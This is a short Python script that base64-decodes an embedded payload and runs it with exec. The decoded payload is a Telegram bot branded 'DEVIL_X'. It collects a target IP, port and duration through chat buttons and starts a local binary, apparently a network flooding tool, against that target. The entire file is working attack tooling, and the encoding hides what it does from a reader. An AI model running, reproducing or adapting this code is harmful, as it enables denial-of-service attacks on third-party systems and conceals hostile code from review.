import base64

# Encoded string embedded directly into the script
encoded_script = '''aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGxvZ2dpbmcKZnJvbSB0ZWxlZ3JhbSBpbXBvcnQgVXBkYXRlLCBJbmxpbmVLZXlib2FyZEJ1dHRvbiwgSW5saW5lS2V5Ym9hcmRNYXJrdXAKZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIENhbGxiYWNrUXVlcnlIYW5kbGVyLCBDb250ZXh0VHlwZXMsIGZpbHRlcnMKZnJvbSBmbGFzaGggaW1wb3J0IFRPS0VOICAjIEltcG9ydCB0aGUgVE9LRU4gdmFyaWFibGUgCgojIFNldCB1cCBsb2dnaW5nCmxvZ2dpbmcuYmFzaWNDb25maWcoZm9ybWF0PSclKGFzY3RpbWUpcyAtICUobmFtZSlzIC0gJShsZXZlbG5hbWUpcyAtICUobWVzc2FnZSlzJywgbGV2ZWw9bG9nZ2luZy5JTkZPKQoKIyBQYXRoIHRvIHlvdXIgYmluYXJ5CkJJTkFSWV9QQVRIID0gIi4vZmxhc2giCgojIEdsb2JhbCB2YXJpYWJsZXMKcHJvY2VzcyA9IE5vbmUKdGFyZ2V0X2lwID0gTm9uZQp0YXJnZXRfcG9ydCA9IE5vbmUKYXR0YWNrX3RpbWUgPSBOb25lCgojIFN0YXJ0IGNvbW1hbmQ6IFNob3cgQXR0YWNrIGJ1dHRvbgphc3luYyBkZWYgc3RhcnQodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAga2V5Ym9hcmQgPSBbW0lubGluZUtleWJvYXJkQnV0dG9uKCLwn5qAQXR0YWNr8J+agCIsIGNhbGxiYWNrX2RhdGE9J2F0dGFjaycpXV0KICAgIHJlcGx5X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKGtleWJvYXJkKQogICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgiQnkgaHR0cHM6Ly90Lm1lL2ZsYXNobWFpbmNoYW5uZWwg8J+agFByZXNzIHRoZSBBdHRhY2sgYnV0dG9uIHRvIHN0YXJ0IERFVklMX1giLCByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwKQoKIyBIYW5kbGUgYnV0dG9uIGNsaWNrcwphc3luYyBkZWYgYnV0dG9uX2hhbmRsZXIodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgcXVlcnkgPSB1cGRhdGUuY2FsbGJhY2tfcXVlcnkKICAgIGF3YWl0IHF1ZXJ5LmFuc3dlcigpCgogICAgaWYgcXVlcnkuZGF0YSA9PSAnYXR0YWNrJzoKICAgICAgICBhd2FpdCBxdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIkJ5IGh0dHBzOi8vdC5tZS9VTUVTSCBQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgaW4gdGhlIGZvcm1hdDo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agPCfmoAiKQoKIyBIYW5kbGUgdGFyZ2V0LCBwb3J0LCBhbmQgdGltZSBpbnB1dAphc3luYyBkZWYgaGFuZGxlX2lucHV0KHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToKICAgIGdsb2JhbCB0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBhdHRhY2tfdGltZQoKICAgIGlmIHVwZGF0ZS5tZXNzYWdlIGlzIE5vbmU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lIGluIHRoZSBmb3JtYXQ6PHRhcmdldD4gPHBvcnQ+IDx0aW1lPvCfmoDwn5qAIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgIyBVc2VyIGlucHV0IGlzIGV4cGVjdGVkIGluIHRoZSBmb3JtYXQ6IDx0YXJnZXQ+IDxwb3J0PiA8dGltZT4KICAgICAgICB0YXJnZXQsIHBvcnQsIHRpbWUgPSB1cGRhdGUubWVzc2FnZS50ZXh0LnNwbGl0KCkKICAgICAgICB0YXJnZXRfaXAgPSB0YXJnZXQKICAgICAgICB0YXJnZXRfcG9ydCA9IGludChwb3J0KQogICAgICAgIGF0dGFja190aW1lID0gaW50KHRpbWUpCgogICAgICAgICMgU2hvdyBTdGFydCwgU3RvcCwgYW5kIFJlc2V0IGJ1dHRvbnMgYWZ0ZXIgaW5wdXQgaXMgcmVjZWl2ZWQKICAgICAgICBrZXlib2FyZCA9IFsKICAgICAgICAgICAgW0lubGluZUtleWJvYXJkQnV0dG9uKCJTdGFydCBBdHRhY2vwn5qAIiwgY2FsbGJhY2tfZGF0YT0nc3RhcnRfYXR0YWNrJyldLAogICAgICAgICAgICBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlN0b3AgQXR0YWNr4p2MIiwgY2FsbGJhY2tfZGF0YT0nc3RvcF9hdHRhY2snKV0sCiAgICAgICAgICAgIFtJbmxpbmVLZXlib2FyZEJ1dHRvbigiUmVzZXQgQXR0YWNr4pqZ77iPIiwgY2FsbGJhY2tfZGF0YT0ncmVzZXRfYXR0YWNrJyldCiAgICAgICAgXQogICAgICAgIHJlcGx5X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKGtleWJvYXJkKQogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoZiJUYXJnZXQ6IHt0YXJnZXRfaXB9LCBQb3J0OiB7dGFyZ2V0X3BvcnR9LCBUaW1lOiB7YXR0YWNrX3RpbWV9IHNlY29uZHMgY29uZmlndXJlZC5cbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJOb3cgY2hvb3NlIGFuIGFjdGlvbjoiLCByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dCgnJydJbnZhbGlkIGZvcm1hdC4gUGxlYXNlIGVudGVyIGluIHRoZSBmb3JtYXQ6IAo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agPCfmoAnJycpCgojIFN0YXJ0IHRoZSBhdHRhY2sKYXN5bmMgZGVmIHN0YXJ0X2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgcHJvY2VzcywgdGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgYXR0YWNrX3RpbWUKICAgIGlmIG5vdCB0YXJnZXRfaXAgb3Igbm90IHRhcmdldF9wb3J0IG9yIG5vdCBhdHRhY2tfdGltZToKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJQbGVhc2UgY29uZmlndXJlIHRoZSB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lIGZpcnN0LiIpCiAgICAgICAgcmV0dXJuCgogICAgaWYgcHJvY2VzcyBhbmQgcHJvY2Vzcy5wb2xsKCkgaXMgTm9uZToKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgaXMgYWxyZWFkeSBydW5uaW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgICMgUnVuIHRoZSBiaW5hcnkgd2l0aCB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lCiAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MuUG9wZW4oW0JJTkFSWV9QQVRILCB0YXJnZXRfaXAsIHN0cih0YXJnZXRfcG9ydCksIHN0cihhdHRhY2tfdGltZSldLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKQogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoZiIge3RhcmdldF9pcH06e3RhcmdldF9wb3J0fSBmb3Ige2F0dGFja190aW1lfSBzZWNvbmRzICBXaXRoIERFVklMX1giKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoZiJFcnJvciBzdGFydGluZyBhdHRhY2s6IHtlfSIpCiAgICAgICAgbG9nZ2luZy5lcnJvcihmIkVycm9yIHN0YXJ0aW5nIGF0dGFjazoge2V9IikKCiMgU3RvcCB0aGUgYXR0YWNrCmFzeW5jIGRlZiBzdG9wX2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgcHJvY2VzcwogICAgaWYgbm90IHByb2Nlc3Mgb3IgcHJvY2Vzcy5wb2xsKCkgaXMgbm90IE5vbmU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiREVWSUxfWCAiKQogICAgICAgIHJldHVybgoKICAgIHByb2Nlc3MudGVybWluYXRlKCkKICAgIHByb2Nlc3Mud2FpdCgpCiAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgc3RvcHBlZC4iKQoKIyBSZXNldCB0aGUgYXR0YWNrCmFzeW5jIGRlZiByZXNldF9hdHRhY2sodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgZ2xvYmFsIHByb2Nlc3MsIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGF0dGFja190aW1lCiAgICBpZiBwcm9jZXNzIGFuZCBwcm9jZXNzLnBvbGwoKSBpcyBOb25lOgogICAgICAgIHByb2Nlc3MudGVybWluYXRlKCkKICAgICAgICBwcm9jZXNzLndhaXQoKQoKICAgIHRhcmdldF9pcCA9IE5vbmUKICAgIHRhcmdldF9wb3J0ID0gTm9uZQogICAgYXR0YWNrX3RpbWUgPSBOb25lCiAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgcmVzZXQuIEJ5IGh0dHBzOi8vdC5tZS9VTUVTSCBQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgaW4gdGhlIGZvcm1hdDo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agCIpCgojIEJ1dHRvbiBhY3Rpb24gaGFuZGxlciBmb3Igc3RhcnQvc3RvcC9yZXNldCBhY3Rpb25zCmFzeW5jIGRlZiBidXR0b25fY2FsbGJhY2tfaGFuZGxlcih1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBxdWVyeSA9IHVwZGF0ZS5jYWxsYmFja19xdWVyeQogICAgYXdhaXQgcXVlcnkuYW5zd2VyKCkKCiAgICBpZiBxdWVyeS5kYXRhID09ICdzdGFydF9hdHRhY2snOgogICAgICAgIGF3YWl0IHN0YXJ0X2F0dGFjayh1cGRhdGUsIGNvbnRleHQpCiAgICBlbGlmIHF1ZXJ5LmRhdGEgPT0gJ3N0b3BfYXR0YWNrJzoKICAgICAgICBhd2FpdCBzdG9wX2F0dGFjayh1cGRhdGUsIGNvbnRleHQpCiAgICBlbGlmIHF1ZXJ5LmRhdGEgPT0gJ3Jlc2V0X2F0dGFjayc6CiAgICAgICAgYXdhaXQgcmVzZXRfYXR0YWNrKHVwZGF0ZSwgY29udGV4dCkKCiMgTWFpbiBmdW5jdGlvbiB0byBzdGFydCB0aGUgYm90CmRlZiBtYWluKCk6CiAgICAjIENyZWF0ZSBBcHBsaWNhdGlvbiBvYmplY3Qgd2l0aCB5b3VyIGJvdCdzIHRva2VuCiAgICBhcHBsaWNhdGlvbiA9IEFwcGxpY2F0aW9uLmJ1aWxkZXIoKS50b2tlbihUT0tFTikuYnVpbGQoKQoKICAgICMgUmVnaXN0ZXIgY29tbWFuZCBoYW5kbGVyIGZvciAvc3RhcnQKICAgIGFwcGxpY2F0aW9uLmFkZF9oYW5kbGVyKENvbW1hbmRIYW5kbGVyKCJzdGFydCIsIHN0YXJ0KSkKCiAgICAjIFJlZ2lzdGVyIGJ1dHRvbiBoYW5kbGVyCiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDYWxsYmFja1F1ZXJ5SGFuZGxlcihidXR0b25faGFuZGxlciwgcGF0dGVybj0nXmF0dGFjayQnKSkKICAgIGFwcGxpY2F0aW9uLmFkZF9oYW5kbGVyKENhbGxiYWNrUXVlcnlIYW5kbGVyKGJ1dHRvbl9jYWxsYmFja19oYW5kbGVyLCBwYXR0ZXJuPSdeKHN0YXJ0X2F0dGFja3xzdG9wX2F0dGFja3xyZXNldF9hdHRhY2spJCcpKQoKICAgICMgUmVnaXN0ZXIgbWVzc2FnZSBoYW5kbGVyIHRvIGhhbmRsZSBpbnB1dCBmb3IgdGFyZ2V0LCBwb3J0LCBhbmQgdGltZQogICAgYXBwbGljYXRpb24uYWRkX2hhbmRsZXIoTWVzc2FnZUhhbmRsZXIoZmlsdGVycy5URVhUICYgfmZpbHRlcnMuQ09NTUFORCwgaGFuZGxlX2lucHV0KSkKCiAgICAjIFN0YXJ0IHRoZSBib3QKICAgIGFwcGxpY2F0aW9uLnJ1bl9wb2xsaW5nKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk=''

# Decode and execute the script
decoded_script = base64.b64decode(encoded_script).decode('utf-8')
exec(decoded_script)
